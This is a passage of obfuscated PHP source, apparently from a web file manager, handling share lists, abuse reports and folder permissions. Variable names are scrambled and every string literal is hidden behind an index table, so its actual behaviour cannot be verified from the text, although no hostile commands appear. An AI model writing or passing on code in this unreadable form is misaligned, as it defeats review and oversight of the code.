array_to_keyvalue($š®‡–¶¾, $ÍÖÁØ´ [12], $ÍÖÁØ´ [665]); if (!$š®‡–¶¾) { return; } $ÔäÔªÍÕ = array($ÍÖÁØ´ [2124] => array($ÍÖÁØ´ [492], $š®‡–¶¾)); $this->where($ÔäÔªÍÕ)->delete(); Model($ÍÖÁØ´ [666])->where($ÔäÔªÍÕ)->delete(); } public function listAll($ÌÑÕ¶ø‘) { $§¸ŸÎä =& $_SERVER[óÔë„ú]; $ß¢Ê³ıß = array(); if ($ÌÑÕ¶ø‘[$§¸ŸÎä[1758]]) { $ß¢Ê³ıß[$§¸ŸÎä[1758]] = $ÌÑÕ¶ø‘[$§¸ŸÎä[1758]]; } if ($ÌÑÕ¶ø‘[$§¸ŸÎä[820]]) { $Ê’Õ„•± = $ÌÑÕ¶ø‘[$§¸ŸÎä[821]] ? $ÌÑÕ¶ø‘[$§¸ŸÎä[821]] : strtotime(date($§¸ŸÎä[2132])); $ß¢Ê³ıß[$§¸ŸÎä[231]] = array($§¸ŸÎä[409], array($ÌÑÕ¶ø‘[$§¸ŸÎä[820]], $Ê’Õ„•±)); } if ($ÌÑÕ¶ø‘[$§¸ŸÎä[33]]) { $ß¢Ê³ıß[$ÌÑÕ¶ø‘[$§¸ŸÎä[33]]] = 1; } else { $ß¢Ê³ıß[] = array($§¸ŸÎä[562] => array($§¸ŸÎä[1075], 0), $§¸ŸÎä[663] => array($§¸ŸÎä[1075], 0), $§¸ŸÎä[2106] => $§¸ŸÎä[2059]); } if ($ÌÑÕ¶ø‘[$§¸ŸÎä[2055]]) { $ß¢Ê³ıß[] = array($§¸ŸÎä[2103] => $ÌÑÕ¶ø‘[$§¸ŸÎä[2055]], $§¸ŸÎä[1647] => array($§¸ŸÎä[459], "\x25{$ÌÑÕ¶ø‘[$§¸ŸÎä[2055]]}\x25"), $§¸ŸÎä[2106] => $§¸ŸÎä[2059]); } $Ú¾Âˆ÷ = $this->_makeOrder()->where($ß¢Ê³ıß)->selectPage(20); if (empty($Ú¾Âˆ÷[$§¸ŸÎä[445]])) { return array(); } $this->_listDataApply($Ú¾Âˆ÷[$§¸ŸÎä[445]]); return $Ú¾Âˆ÷; } public function listDataApply($Ç½œÔ‚µ) { $this->_listDataApply($Ç½œÔ‚µ); return $Ç½œÔ‚µ; } private function _listDataApply(&$ŠºÜÃúã) { $µ·¬¯ =& $_SERVER[óÔë„ú]; $Õéí¬Ô = array_to_keyvalue($ŠºÜÃúã, $µ·¬¯[12], $µ·¬¯[1758]); $ÅÛÀıËÍ = Model($µ·¬¯[598])->userListInfo(array_unique($Õéí¬Ô)); $˜ê‘­ãå = array_to_keyvalue($ŠºÜÃúã, $µ·¬¯[12], $µ·¬¯[193]); $’õÙ…‡È = Model($µ·¬¯[884])->sourceListInfo($˜ê‘­ãå, !0); foreach ($ŠºÜÃúã as $†ûÜ¬åš => &$¡“¢ÏÁ©) { $é»Â‹¤¿ = $¡“¢ÏÁ©[$µ·¬¯[1758]]; $¡“¢ÏÁ©[$µ·¬¯[2133]] = $ÅÛÀıËÍ[$é»Â‹¤¿] ? $ÅÛÀıËÍ[$é»Â‹¤¿] : !1; $·Ñ¨î†Ñ = $¡“¢ÏÁ©[$µ·¬¯[193]]; $¡“¢ÏÁ©[$µ·¬¯[90]] = $’õÙ…‡È[$·Ñ¨î†Ñ] ? $’õÙ…‡È[$·Ñ¨î†Ñ] : !1; if ($¡“¢ÏÁ©[$µ·¬¯[90]][$µ·¬¯[505]] == $µ·¬¯[91]) { unset($ŠºÜÃúã[$†ûÜ¬åš]); } if ($¡“¢ÏÁ©[$µ·¬¯[90]] != $µ·¬¯[228] && !$¡“¢ÏÁ©[$µ·¬¯[90]]) { unset($ŠºÜÃúã[$†ûÜ¬åš]); } } unset($¡“¢ÏÁ©); $ŠºÜÃúã = array_values($ŠºÜÃúã); } private function _makeOrder($Éò‡„ôá = '') { $¢¸İ¬ïÒ =& $_SERVER[óÔë„ú]; $¸Ãèöåù = array($¢¸İ¬ïÒ[231], $¢¸İ¬ïÒ[821], $¢¸İ¬ïÒ[2120], $¢¸İ¬ïÒ[2121]); $Îù×´¯ = array($¢¸İ¬ïÒ[523] => $¢¸İ¬ïÒ[524], $¢¸İ¬ïÒ[525] => $¢¸İ¬ïÒ[526]); $´ºÕş»Æ = Input::get($¢¸İ¬ïÒ[530], $¢¸İ¬ïÒ[7], $¢¸İ¬ïÒ[497], $¸Ãèöåù); $«éŞÄ” = Input::get($¢¸İ¬ïÒ[531], $¢¸İ¬ïÒ[7], $¢¸İ¬ïÒ[2134], array($¢¸İ¬ïÒ[2052], $¢¸İ¬ïÒ[525])); $«éŞÄ” = $Îù×´¯[$«éŞÄ”]; $Éò‡„ôá = $Éò‡„ôá . "{$´ºÕş»Æ}\x20{$«éŞÄ”}"; return $this->order($Éò‡„ôá); } public function reportAdd($êé¾„¨») { $ ºÁ¡Â =& $_SERVER[óÔë„ú]; $Å€¤„ê = array($ ºÁ¡Â[665] => $êé¾„¨»[$ ºÁ¡Â[665]], $ ºÁ¡Â[1758] => USER_ID); if (Model($ ºÁ¡Â[2130])->where($Å€¤„ê)->find()) { return !1; } $ÙÁ‘¾Ú³ = array($ ºÁ¡Â[665] => $êé¾„¨»[$ ºÁ¡Â[665]], $ ºÁ¡Â[1647] => $êé¾„¨»[$ ºÁ¡Â[1647]], $ ºÁ¡Â[193] => $êé¾„¨»[$ ºÁ¡Â[193]], $ ºÁ¡Â[541] => $êé¾„¨»[$ ºÁ¡Â[541]], $ ºÁ¡Â[1758] => USER_ID, $ ºÁ¡Â[33] => $êé¾„¨»[$ ºÁ¡Â[33]], $ ºÁ¡Â[526] => $êé¾„¨»[$ ºÁ¡Â[526]]); return Model($ ºÁ¡Â[2130])->add($ÙÁ‘¾Ú³); } public function reportList($‹áé˜£) { $‹–Ëšùõ =& $_SERVER[óÔë„ú]; $Ûô©’›ç = array(); if ($‹áé˜£[$‹–Ëšùõ[820]]) { $èşè¦¹î = $‹áé˜£[$‹–Ëšùõ[821]] ? $‹áé˜£[$‹–Ëšùõ[821]] : strtotime(date($‹–Ëšùõ[2132])); $Ûô©’›ç[$‹–Ëšùõ[231]] = array($‹–Ëšùõ[409], array($‹áé˜£[$‹–Ëšùõ[820]], $èşè¦¹î)); } if (isset($‹áé˜£[$‹–Ëšùõ[33]]) && in_array($‹áé˜£[$‹–Ëšùõ[33]], array($‹–Ëšùõ[91], $‹–Ëšùõ[510], $‹–Ëšùõ[2135], $‹–Ëšùõ[2136], $‹–Ëšùõ[2137]))) { $Ûô©’›ç[$‹–Ëšùõ[33]] = $‹áé˜£[$‹–Ëšùõ[33]]; } if (isset($‹áé˜£[$‹–Ëšùõ[810]]) && in_array($‹áé˜£[$‹–Ëšùõ[810]], array($‹–Ëšùõ[228], $‹–Ëšùõ[91], $‹–Ëšùõ[510], $‹–Ëšùõ[2135]))) { $Ûô©’›ç[$‹–Ëšùõ[810]] = $‹áé˜£[$‹–Ëšùõ[810]]; } $†öí„ùÍ = Input::get($‹–Ëšùõ[531], $‹–Ëšùõ[7], $‹–Ëšùõ[2134], array($‹–Ëšùõ[2052], $‹–Ëšùõ[525])); $“µáÆŸÖ = array($‹–Ëšùõ[523] => $‹–Ëšùõ[524], $‹–Ëšùõ[525] => $‹–Ëšùõ[526]); $Î´Ã‰ìá = $‹–Ëšùõ[2138] . $“µáÆŸÖ[$†öí„ùÍ]; $…÷Öúàƒ = Model($‹–Ëšùõ[2130])->where($Ûô©’›ç)->order($Î´Ã‰ìá)->selectPage(20); if (empty($…÷Öúàƒ[$‹–Ëšùõ[445]])) { return array(); } $Õ¯‘‘„È = array_to_keyvalue_group($…÷Öúàƒ[$‹–Ëšùõ[445]], $‹–Ëšùõ[810], $‹–Ëšùõ[665]); if (!empty($Õ¯‘‘„È[0])) { $‹áé˜£ = $Õ¯‘‘„È[0]; $Ûô©’›ç = array($‹–Ëšùõ[665] => array($‹–Ëšùõ[7], $‹áé˜£)); $¤áüî’ç = $this->where($Ûô©’›ç)->field($‹–Ëšùõ[665])->select(); $¤áüî’ç = array_to_keyvalue($¤áüî’ç, $‹–Ëšùõ[12], $‹–Ëšùõ[665]); $¯»Ù³¬± = array_diff($‹áé˜£, $¤áüî’ç); if (!empty($¯»Ù³¬±)) { foreach ($…÷Öúàƒ[$‹–Ëšùõ[445]] as $å¸­á÷š => $ê”Œ‚ÖÃ) { if (in_array($ê”Œ‚ÖÃ[$‹–Ëšùõ[665]], $¯»Ù³¬±)) { unset($…÷Öúàƒ[$‹–Ëšùõ[445]][$å¸­á÷š]); } } } } $this->_listDataApply($…÷Öúàƒ[$‹–Ëšùõ[445]]); return $…÷Öúàƒ; } public function reportStatus($Æá®­¦¾) { $†ãÀ÷Ù‚ =& $_SERVER[óÔë„ú]; $¦éíêç = array($†ãÀ÷Ù‚[475] => $Æá®­¦¾[$†ãÀ÷Ù‚[475]]); $šíö¤ÄŒ = Model($†ãÀ÷Ù‚[2130])->where($¦éíêç)->field($†ãÀ÷Ù‚[2139])->find(); if (!$šíö¤ÄŒ) { return !1; } $à­‘á„ø = array($†ãÀ÷Ù‚[810] => $Æá®­¦¾[$†ãÀ÷Ù‚[810]]); if ($Æá®­¦¾[$†ãÀ÷Ù‚[810]] == $†ãÀ÷Ù‚[2135] && $šíö¤ÄŒ[$†ãÀ÷Ù‚[810]] == $†ãÀ÷Ù‚[2135]) { $à­‘á„ø[$†ãÀ÷Ù‚[810]] = 0; } $äÆğ‚Å = Model($†ãÀ÷Ù‚[2130])->where($¦éíêç)->save($à­‘á„ø); if ($Æá®­¦¾[$†ãÀ÷Ù‚[810]] == $†ãÀ÷Ù‚[510]) { if ($šíö¤ÄŒ[$†ãÀ÷Ù‚[541]] != $†ãÀ÷Ù‚[228] && $this->shareFileMeta($šíö¤ÄŒ[$†ãÀ÷Ù‚[541]])) { $this->shareFileMeta($šíö¤ÄŒ[$†ãÀ÷Ù‚[541]], 0); } $this->remove($šíö¤ÄŒ[$†ãÀ÷Ù‚[665]]); return !0; } if ($äÆğ‚Å && $Æá®­¦¾[$†ãÀ÷Ù‚[810]] == $†ãÀ÷Ù‚[2135]) { $ˆæÉØù¾ = $à­‘á„ø[$†ãÀ÷Ù‚[810]] == $†ãÀ÷Ù‚[2135] ? 1 : 0; $this->shareFileMeta($šíö¤ÄŒ[$†ãÀ÷Ù‚[541]], $ˆæÉØù¾); $this->removeByFile($šíö¤ÄŒ[$†ãÀ÷Ù‚[541]]); } return $äÆğ‚Å; } private function removeByFile($¸®­ßûŸ) { $êê´»Ï˜ =& $_SERVER[óÔë„ú]; $÷öÄ™ûİ = Model($êê´»Ï˜[884])->where(array($êê´»Ï˜[541] => $¸®­ßûŸ))->field($êê´»Ï˜[193])->select(); $İÎÀ–Æ˜ = array_to_keyvalue($÷öÄ™ûİ, $êê´»Ï˜[12], $êê´»Ï˜[193]); $£¿şÔâ = array($êê´»Ï˜[193] => array($êê´»Ï˜[7], $İÎÀ–Æ˜), $êê´»Ï˜[562] => 1); $÷öÄ™ûİ = $this->where($£¿şÔâ)->field($êê´»Ï˜[665])->select(); if (empty($÷öÄ™ûİ)) { return; } $çĞ¡¦ æ = array_to_keyvalue($÷öÄ™ûİ, $êê´»Ï˜[12], $êê´»Ï˜[665]); $this->remove($çĞ¡¦ æ); } private function shareFileMeta($Äµ®Ãâ‡, $Ò•£‹‘ = null) { $ €Ö ÅŠ =& $_SERVER[óÔë„ú]; $şòúÕ = array($ €Ö ÅŠ[541] => $Äµ®Ãâ‡, $ €Ö ÅŠ[97] => $ €Ö ÅŠ[2140]); if (is_null($Ò•£‹‘)) { return Model($ €Ö ÅŠ[2141])->where($şòúÕ)->find(); } $şòúÕ[$ €Ö ÅŠ[450]] = $Ò•£‹‘; Model($ €Ö ÅŠ[2141])->add($şòúÕ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\x63\145\137\141\165\x74\150"; public function getAuth($Ğş»¢í÷) { $³Ã¯¥‡ =& $_SERVER[óÔë„ú]; $€¡üÄß = $this->sourceAuthSelect($Ğş»¢í÷); $«ŠÄ½µÔ = array(); $Å¶á»²£ = array(); $ÑòêÀ = 2 << 25; foreach ($€¡üÄß as $‡ÓÒ÷ŠŞ) { $ö­àè† = Model($³Ã¯¥‡[571])->listData($‡ÓÒ÷ŠŞ[$³Ã¯¥‡[2065]]); if (!$ö­àè†) { continue; } $«ŠÄ½µÔ[] = $‡ÓÒ÷ŠŞ; $Ø‰í†ê» = 0; if ($‡ÓÒ÷ŠŞ[$³Ã¯¥‡[190]] == SourceModel::TYPE_GROUP) { $Ø‰í†ê» = $ÑòêÀ * 2; } if ($‡ÓÒ÷ŠŞ[$³Ã¯¥‡[190]] == SourceModel::TYPE_USER) { $Ø‰í†ê» = $ÑòêÀ; } if ($‡ÓÒ÷ŠŞ[$³Ã¯¥‡[190]] == SourceModel::TYPE_USER && $‡ÓÒ÷ŠŞ[$³Ã¯¥‡[569]] == $³Ã¯¥‡[228]) { $Ø‰í†ê» = 0; } $Å¶á»²£[] = $ö­àè†[$³Ã¯¥‡[487]] + $Ø‰í†ê»; } array_multisort($Å¶á»²£, SORT_DESC, $«ŠÄ½µÔ); return $«ŠÄ½µÔ; } public function sourceAuthSelect($Äñ™ ô) { $¾ºßƒˆ =& $_SERVER[óÔë„ú]; static $ÓÉ°«Å = array(); $Í½°æØ = is_array($Äñ™ ô) ? !1 : !0; if ($Í½°æØ) { $Äñ™ ô = array($Äñ™ ô); } $‹šß·ú¾ = array(); foreach ($Äñ™ ô as $Åç ®İ¬) { if (isset($ÓÉ°«Å[$Åç ®İ¬])) { $‹šß·ú¾[$Åç ®İ¬] = $ÓÉ°«Å[$Åç ®İ¬]; } } if (count($‹šß·ú¾) == count($Äñ™ ô)) { return $Í½°æØ ? $‹šß·ú¾[$Äñ™ ô[0]] : $‹šß·ú¾; } $–ˆ½™­ô = $¾ºßƒˆ[2142]; $§ı‡Û˜ = array($¾ºßƒˆ[193] => array($¾ºßƒˆ[7], $Äñ™ ô)); $Ò‘–ªò¨ = $this->field($–ˆ½™­ô)->order($¾ºßƒˆ[475])->where($§ı‡Û˜)->select(); $‡É‘·×› = array_to_keyvalue_group($Ò‘–ªò¨, $¾ºßƒˆ[193]); foreach ($Äñ™ ô as $Åç ®İ¬) { $ÓÉ°«Å[$Åç ®İ¬] = $‡É‘·×›[$Åç ®İ¬] ? $‡É‘·×›[$Åç ®İ¬] : array(); } if ($Í½°æØ) { return $Ò‘–ªò¨; } return $‡É‘·×›; } public function setAuth($Íş£‚Æˆ, $ÓÖ„Ÿóù) { $«ˆ‡¹¸È =& $_SERVER[óÔë„ú]; $üú«Ã£ö = Model($«ˆ‡¹¸È[1405])->sourceInfo($Íş£‚Æˆ); if (!$üú«Ã£ö) { return !1; } if ($üú«Ã£ö[$«ˆ‡¹¸È[190]] != SourceModel::TYPE_GROUP) { return !1; } $ù•‘´š¼ = 1; $É¡êøä = $üú«Ã£ö[$«ˆ‡¹¸È[569]]; if ($É¡êøä != $ù•‘´š¼) { $Ü–ÆÁü‰ = array($«ˆ‡¹¸È[1957] => $É¡êøä); $ñŞ»óĞ  = Model($«ˆ‡¹¸È[2051])->field($«ˆ‡¹¸È[1758])->where($Ü–ÆÁü‰)->select(); $ñŞ»óĞ  = array_to_keyvalue($ñŞ»óĞ , $«ˆ‡¹¸È[12], $«ˆ‡¹¸È[1758]); } $¹Ñ¶İÁâ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ù—›„ = array(); foreach ($ÓÖ„Ÿóù as $È¨ºÚ‘å) { if (!in_array($È¨ºÚ‘å[$«ˆ‡¹¸È[190]], $¹Ñ¶İÁâ)) { show_json(LNG($«ˆ‡¹¸È[2143]), !1); } if ($É¡êøä != $ù•‘´š¼) { if ($È¨ºÚ‘å[$«ˆ‡¹¸È[190]] == SourceModel::TYPE_GROUP) { } if ($È¨ºÚ‘å[$«ˆ‡¹¸È[569]] != 0 && !in_array($È¨ºÚ‘å[$«ˆ‡¹¸È[569]], $ñŞ»óĞ )) { } } if ($È¨ºÚ‘å[$«ˆ‡¹¸È[569]] == 0) { $È¨ºÚ‘å[$«ˆ‡¹¸È[190]] = SourceModel::TYPE_USER; } $Ù—›„[] = array($«ˆ‡¹¸È[193] => $Íş£‚Æˆ, $«ˆ‡¹¸È[190] => intval($È¨ºÚ‘å[$«ˆ‡¹¸È[190]]), $«ˆ‡¹¸È[569] => intval($È¨ºÚ‘å[$«ˆ‡¹¸È[569]]), $«ˆ‡¹¸È[2065] => intval($È¨ºÚ‘å[$«ˆ‡¹¸È[2065]]) ? intval($È¨ºÚ‘å[$«ˆ‡¹¸È[2065]]) : 0, $«ˆ‡¹¸È[2125] => intval($È¨ºÚ‘å[$«ˆ‡¹¸È[2125]]) ? intval($È¨ºÚ‘å[$«ˆ‡¹¸È[2125]]) : -1); } $this->where(array($«ˆ‡¹¸È[491] => $Íş£‚Æˆ))->delete(); $this->addAll($Ù—›„); return !0; } public function authClear($æÂò€Í²) { $ÜğÜÂ‚¹ =& $_SERVER[óÔë„ú]; $‹½Ñğƒ = Model($ÜğÜÂ‚¹[1405])->sourceInfo($æÂò€Í²); $÷«í“â = array($æÂò€Í²); if ($‹½Ñğƒ[$ÜğÜÂ‚¹[485]] == $ÜğÜÂ‚¹[91]) { $ãËßâ² = array($ÜğÜÂ‚¹[652] => array($ÜğÜÂ‚¹[612], $‹½Ñğƒ[$ÜğÜÂ‚¹[584]] . $æÂò€Í² . $ÜğÜÂ‚¹[613])); $÷«í“â = Model($ÜğÜÂ‚¹[1405])->field($ÜğÜÂ‚¹[491])->where($ãËßâ²)->getField($ÜğÜÂ‚¹[193], !0); $÷«í“â[] = $æÂò€Í²; } $this->where(array($ÜğÜÂ‚¹[491] => array($ÜğÜÂ‚¹[492], $÷«í“â)))->delete(); return !0; } public function getAllChildren($ÄèÉ€³Œ) { $ª”¥Å¢ =& $_SERVER[óÔë„ú]; $ùÌô¿­Ú = Model($ª”¥Å¢[1405])->sourceInfo($ÄèÉ€³Œ); if ($ùÌô¿­Ú[$ª”¥Å¢[485]] != $ª”¥Å¢[91]) { return $this->sourceListAuth(array($ÄèÉ€³Œ)); } if ($ùÌô¿­Ú[$ª”¥Å¢[190]] != SourceModel::TYPE_GROUP) { return array(); } $şÉ‚Ş£ = 1; $òİ“‘¬ê = array($ÄèÉ€³Œ); if ($ùÌô¿­Ú[$ª”¥Å¢[192]] == $ª”¥Å¢[228] && $ùÌô¿­Ú[$ª”¥Å¢[569]] != $şÉ‚Ş£) { $òİ“‘¬ê = $this->groupChidldAllRootSource($ùÌô¿­Ú[$ª”¥Å¢[569]]); } $×¡ò¸Şô = $this->field($ª”¥Å¢[193])->group($ª”¥Å¢[193])->select(); $×¡ò¸Şô = array_to_keyvalue($×¡ò¸Şô, $ª”¥Å¢[12], $ª”¥Å¢[193]); if (!$×¡ò¸Şô) { return array(); } $áöà£ = $ª”¥Å¢[2144]; $×ùèÕô¿ = array($ª”¥Å¢[193] => array($ª”¥Å¢[7], $×¡ò¸Şô), $ª”¥Å¢[505] => $ª”¥Å¢[228]); $•Öµıîë = Model($ª”¥Å¢[884])->field($áöà£)->where($×ùèÕô¿)->select(); $Œß„å÷• = array($ÄèÉ€³Œ); foreach ($•Öµıîë as $¥´„ÇÓ) { foreach ($òİ“‘¬ê as $¶‘üá¨¢) { $ß¯‹•âô = $ª”¥Å¢[50] . $¶‘üá¨¢ . $ª”¥Å¢[50]; $şö–»ûÅ = $¥´„ÇÓ[$ª”¥Å¢[584]] . $¥´„ÇÓ[$ª”¥Å¢[193]] . $ª”¥Å¢[50]; if (strstr($şö–»ûÅ, $ß¯‹•âô)) { $Œß„å÷•[] = $¥´„ÇÓ[$ª”¥Å¢[193]]; break; } } } return $this->sourceListAuth($Œß„å÷•); } private function sourceListAuth($† †Ó˜) { $ş½Æ©¹ =& $_SERVER[óÔë„ú]; $ÍÖ‘¸•£ = Model($ş½Æ©¹[1405])->sourceListInfo($† †Ó˜, !0); $Î…›Ã¸” = $this->sourceAuthSelect($† †Ó˜); $Ô©ŞÎ = array(); $ŒÚÒµê± = array(); foreach ($ÍÖ‘¸•£ as $ÂÈÇ¼¸Ğ) { unset($ÂÈÇ¼¸Ğ[$ş½Æ©¹[529]]); unset($ÂÈÇ¼¸Ğ[$ş½Æ©¹[527]]); unset($ÂÈÇ¼¸Ğ[$ş½Æ©¹[487]]); unset($ÂÈÇ¼¸Ğ[$ş½Æ©¹[90]]); $ëá¢„ = $Î…›Ã¸”[$ÂÈÇ¼¸Ğ[$ş½Æ©¹[193]]]; if (!$ëá¢„) { continue; } $ÂÈÇ¼¸Ğ[$ş½Æ©¹[2145]] = $this->authTargetInfo($ëá¢„); $ÂÈÇ¼¸Ğ[$ş½Æ©¹[582]] = rtrim($ÂÈÇ¼¸Ğ[$ş½Æ©¹[588]], $ş½Æ©¹[8]) . $ş½Æ©¹[8] . ltrim($ÂÈÇ¼¸Ğ[$ş½Æ©¹[582]], $ş½Æ©¹[8]); $Ô©ŞÎ[] = $ÂÈÇ¼¸Ğ; $ŞÔüÓ¯á = count(explode($ş½Æ©¹[8], trim($ÂÈÇ¼¸Ğ[$ş½Æ©¹[582]], $ş½Æ©¹[8]))); $ŒÚÒµê±[] = $ŞÔüÓ¯á + ($ÂÈÇ¼¸Ğ[$ş½Æ©¹[33]] == $ş½Æ©¹[78] ? 0 : 1000); } array_multisort($ŒÚÒµê±, SORT_ASC, $Ô©ŞÎ); return $Ô©ŞÎ; } private function groupChidldAllRootSource($¨¹¸ıíœ) { $º£ü¶Â® =& $_SERVER[óÔë„ú]; $÷„‚Ò½Ú = Model($º£ü¶Â®[2146])->groupChildrenAll($¨¹¸ıíœ); $Ì¸õ×÷ˆ = array($º£ü¶Â®[192] => 0, $º£ü¶Â®[569] => array($º£ü¶Â®[7], $÷„‚Ò½Ú), $º£ü¶Â®[190] => SourceModel::TYPE_GROUP); $ª¢Îñ©ç = Model($º£ü¶Â®[884])->field($º£ü¶Â®[193])->where($Ì¸õ×÷ˆ)->select(); $ª¢Îñ©ç = array_to_keyvalue($ª¢Îñ©ç, $º£ü¶Â®[12], $º£ü¶Â®[193]); return $ª¢Îñ©ç; } private function authTargetInfo($ÆĞèííª) { $÷î¯é =& $_SERVER[óÔë„ú]; $üÏÅÎèÕ = array(); $ÈãÂ¤… = array(); $õË·ñÖ = 2 << 25; foreach ($ÆĞèííª as $ïäª·˜Ì) { $°¶ª¶¨ = Model($÷î¯é[571])->listData($ïäª·˜Ì[$÷î¯é[2065]]); if (!$°¶ª¶¨) { continue; } if ($ïäª·˜Ì[$÷î¯é[190]] == SourceModel::TYPE_USER) { $©ˆ÷†„” = Model($÷î¯é[577])->getInfoSimpleOuter($ïäª·˜Ì[$÷î¯é[569]]); if ($©ˆ÷†„”[$÷î¯é[1758]] == $÷î¯é[1260]) { continue; } if ($©ˆ÷†„”[$÷î¯é[1758]] == $÷î¯é[228]) { $©ˆ÷†„”[$÷î¯é[32]] = LNG($÷î¯é[2147]); } } else { $©ˆ÷†„” = Model($÷î¯é[585])->getInfoSimple($ïäª·˜Ì[$÷î¯é[569]]); } if (!$©ˆ÷†„”) { continue; } $©ˆ÷†„”[$÷î¯é[540]] = $°¶ª¶¨; $üÏÅÎèÕ[] = $©ˆ÷†„”; $„Ôº•¹Ÿ = 0; if ($ïäª·˜Ì[$÷î¯é[190]] == SourceModel::TYPE_GROUP) { $„Ôº•¹Ÿ = $õË·ñÖ * 2; } if ($ïäª·˜Ì[$÷î¯é[190]] == SourceModel::TYPE_USER) { $„Ôº•¹Ÿ = $õË·ñÖ; } if ($ïäª·˜Ì[$÷î¯é[190]] == SourceModel::TYPE_USER && $ïäª·˜Ì[$÷î¯é[569]] == $÷î¯é[228]) { $„Ôº•¹Ÿ = 0; } $ÈãÂ¤…[] = $°¶ª¶¨[$÷î¯é[487]] + $„Ôº•¹Ÿ; } array_multisort($ÈãÂ¤…, SORT_DESC, $üÏÅÎèÕ); return $üÏÅÎèÕ; } public function getAllChildrenByUser($ŞŒ›´äÊ, $ëÜš€“Ä) { $àÄøƒ•¶ =& $_SERVER[óÔë„ú]; $†‹ºı’Õ = Model($àÄøƒ•¶[598])->getInfo($ëÜš€“Ä); if (!$ëÜš€“Ä || !$ŞŒ›´äÊ || !$†‹ºı’Õ) { return array(); } $½¢üÛèĞ = Model($àÄøƒ•¶[1405])->sourceInfo($ŞŒ›´äÊ); $á„Êß×ó = array(); $á„§Å£Å = 1; if ($½¢üÛèĞ[$àÄøƒ•¶[192]] == $àÄøƒ•¶[228] && $½¢üÛèĞ[$àÄøƒ•¶[569]] != $á„§Å£Å && $this->groupContainUser($½¢üÛèĞ[$àÄøƒ•¶[569]], $ëÜš€“Ä)) { foreach ($†‹ºı’Õ[$àÄøƒ•¶[2148]] as $ƒæ„ÔÍ) { $â®ÈÑâ‘ = Model($àÄøƒ•¶[585])->getInfo($ƒæ„ÔÍ[$àÄøƒ•¶[1957]]); $¯âë“æà = Model($àÄøƒ•¶[598])->getInfoSimpleOuter($ëÜš€“Ä); $¯âë“æà[$àÄøƒ•¶[540]] = $ƒæ„ÔÍ[$àÄøƒ•¶[487]]; if (Model($àÄøƒ•¶[571])->authCheckAction($ƒæ„ÔÍ[$àÄøƒ•¶[487]][$àÄøƒ•¶[487]], $àÄøƒ•¶[1978])) { continue; } $ß’¤ÙÜÖ = array($àÄøƒ•¶[32] => $àÄøƒ•¶[1280] . $â®ÈÑâ‘[$àÄøƒ•¶[32]], $àÄøƒ•¶[193] => $â®ÈÑâ‘[$àÄøƒ•¶[90]][$àÄøƒ•¶[193]], $àÄøƒ•¶[87] => KodIO::make($â®ÈÑâ‘[$àÄøƒ•¶[90]][$àÄøƒ•¶[193]]), $àÄøƒ•¶[192] => $àÄøƒ•¶[228], $àÄøƒ•¶[190] => $àÄøƒ•¶[578], $àÄøƒ•¶[33] => $àÄøƒ•¶[616], $àÄøƒ•¶[582] => $â®ÈÑâ‘[$àÄøƒ•¶[589]], $àÄøƒ•¶[1957] => $â®ÈÑâ‘[$àÄøƒ•¶[1957]], $àÄøƒ•¶[586] => $â®ÈÑâ‘[$àÄøƒ•¶[192]], $àÄøƒ•¶[2145] => array($¯âë“æà)); $á„Êß×ó[$ß’¤ÙÜÖ[$àÄøƒ•¶[193]]] = $ß’¤ÙÜÖ; } } $ÀÑé¤²¾ = array(); $àÉÏğ‹¬ = $this->getAllChildren($ŞŒ›´äÊ); foreach ($àÉÏğ‹¬ as $é„¯Ì÷û) { $Óê­æ¾İ = !1; foreach ($é„¯Ì÷û[$àÄøƒ•¶[2145]] as $¿ı­´İò) { if ($¿ı­´İò[$àÄøƒ•¶[1758]]) { if ($¿ı­´İò[$àÄøƒ•¶[1758]] == $ëÜš€“Ä) { $Óê­æ¾İ = !0; break; } } if ($¿ı­´İò[$àÄøƒ•¶[1957]]) { if ($this->groupContainUser($¿ı­´İò[$àÄøƒ•¶[1957]], $ëÜš€“Ä)) { $Óê­æ¾İ = !0; break; } } } if ($Óê­æ¾İ) { $ÀÑé¤²¾[] = $é„¯Ì÷û; } $Û–“ş® = $é„¯Ì÷û[$àÄøƒ•¶[193]]; if (isset($á„Êß×ó[$Û–“ş®])) { $é„¯Ì÷û[$àÄøƒ•¶[2145]][] = $á„Êß×ó[$Û–“ş®][0]; $á„Êß×ó[$Û–“ş®] = !1; } } $á„Êß×ó = array_filter(array_values($á„Êß×ó)); $ÀÑé¤²¾ = array_merge($á„Êß×ó, $ÀÑé¤²¾); return $ÀÑé¤²¾; } public function setAllChildrenByUser($¿²Âˆœ, $ÏÑ­¹¾İ, $Èåºö’ ) { $Åó¢èšÈ =& $_SERVER[óÔë„ú]; $¿¸Ú˜ö´ = $this->getAllChildrenByUser($¿²Âˆœ, $ÏÑ­¹¾İ); if (!$Èåºö’  || !$¿¸Ú˜ö´) { return !1; } foreach ($¿¸Ú˜ö´ as $Ùºº«¥) { $Î—äï‚ = array(); foreach ($Ùºº«¥[$Åó¢èšÈ[2145]] as $÷ûİàÑë) { $«†»™šÄ = $÷ûİàÑë[$Åó¢èšÈ[540]]; $–çğÖ¡ = $÷ûİàÑë[$Åó¢èšÈ[1758]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $›³ú‚ = $÷ûİàÑë[$Åó¢èšÈ[1758]] ? $÷ûİàÑë[$Åó¢èšÈ[1758]] : $÷ûİàÑë[$Åó¢èšÈ[1957]]; if ($÷ûİàÑë[$Åó¢èšÈ[1758]] && $÷ûİàÑë[$Åó¢èšÈ[1758]] == $ÏÑ­¹¾İ) { continue; } $Î—äï‚[] = array($Åó¢èšÈ[193] => $Ùºº«¥[$Åó¢èšÈ[193]], $Åó¢èšÈ[190] => $–çğÖ¡, $Åó¢èšÈ[569] => intval($›³ú‚), $Åó¢èšÈ[2065] => isset($«†»™šÄ[$Åó¢èšÈ[475]]) ? intval($«†»™šÄ[$Åó¢èšÈ[475]]) : 0, $Åó¢èšÈ[2125] => isset($«†»™šÄ[$Åó¢èšÈ[2125]]) ? intval($«†»™šÄ[$Åó¢èšÈ[2125]]) : -1); } $Î—äï‚[] = array($Åó¢èšÈ[193] => $Ùºº«¥[$Åó¢èšÈ[193]], $Åó¢èšÈ[190] => SourceModel::TYPE_USER, $Åó¢èšÈ[569] => intval($ÏÑ­¹¾İ), $Åó¢èšÈ[2065] => intval($Èåºö’ ), $Åó¢èšÈ[2125] => -1); $this->where(array($Åó¢èšÈ[491] => $Ùºº«¥[$Åó¢èšÈ[193]]))->delete(); $this->addAll($Î—äï‚); } return !0; } public function 